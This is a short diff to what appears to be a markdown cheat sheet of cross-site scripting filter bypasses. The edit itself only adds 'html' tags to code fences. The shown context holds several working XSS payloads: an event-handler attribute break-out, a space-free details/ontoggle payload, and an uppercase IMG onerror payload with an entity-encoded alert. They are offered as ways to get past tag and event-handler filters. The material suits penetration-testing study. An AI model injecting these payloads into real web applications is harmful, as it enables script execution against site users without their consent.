@@ -13,7 +13,7 @@ Did you break out of a tag and script, iframe, img, a, &gt; etc are all blocked?
 ==============
 
 Did they block onerror onload onclick? Try something like this:
-```
+```html
 <XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
 ```
 " onclick="prompt(1)
@@ -48,11 +48,11 @@ https://www.w3.org/TR/html52/single-page.html
 
 When you can't use spaces
 ==============
-```
+```html
 <details/open/ontoggle=prompt(123)>
 ```
 When the text is forced UPPERCASE
 ==============
-```
+```html
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
